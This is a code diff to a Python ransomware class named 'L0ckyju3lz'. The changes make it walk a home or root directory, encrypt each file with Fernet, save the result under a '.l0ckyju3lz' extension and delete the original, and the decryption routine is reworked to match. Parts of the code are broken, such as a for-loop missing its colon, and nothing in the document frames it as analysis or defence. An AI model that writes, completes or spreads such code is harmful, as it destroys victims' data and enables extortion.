@@ -5,6 +5,7 @@ import string
 import random
 import smtplib
 import socket
+import re
 from os.path import expanduser
 from cryptography.fernet import Fernet
 
@@ -101,26 +102,40 @@ class L0ckyju3lz():
         if mode == 'enc':
             # List all files in root_tree (~/ or /)
             for files in os.listdir(self.root_tree):
-                # Change Work-Dir to root_tree
-                os.chdir(self.root_tree)
-                with open(files, 'rb') as f:
-                    file_data = f.read()
-                encrypt_data = self.crypt.encrypt(file_data)
-                with open(files, 'wb') as f:
-                    f.write(encrypt_data)
-                return True
+                try:
+                    # Change Work-Dir to root_tree
+                    os.chdir(self.root_tree)
+                    # Read File
+                    with open(files, 'rb') as f:
+                        file_data = f.read()
+                    # Encrypt data
+                    encrypt_data = self.crypt.encrypt(file_data)
+                    # Save encrypt data to file
+                    with open(files + ".l0ckyju3lz", 'wb') as f:
+                        f.write(encrypt_data)
+                        # Remove old file
+                        try:os.remove(files)
+                        except: continue
+                except: continue
+            return True
 
         elif mode == 'dec':
             # List all files in root_tree (~/ or /)
             for files in os.listdir(self.root_tree)
-                # Change Work-Dir to root_tree
-                os.chdir(self.root_tree)
-                with open(files, 'rb') as f:
-                    file_data = f.read()
-                decrypt_data = self.crypt.decrypt(file_data)
-                with open(files, 'wb') as f:
-                    f.write(decrypt_data)
-                return True
+                try:
+                    # Change Work-Dir to root_tree
+                    os.chdir(self.root_tree)
+                    with open(files + ".l0ckyju3lz", 'rb') as f:
+                        file_data = f.read()
+                    decrypt_data = self.crypt.decrypt(file_data)
+                    old_files = re.sub("\.l0ckyju3lz", "", files)
+                    with open(old_files, 'wb') as f:
+                        f.write(decrypt_data)
+                        # Remove old file
+                        try: os.remove(files)
+                        except: continue
+                except: continue
+            return True
 
     def run(self):
         pass
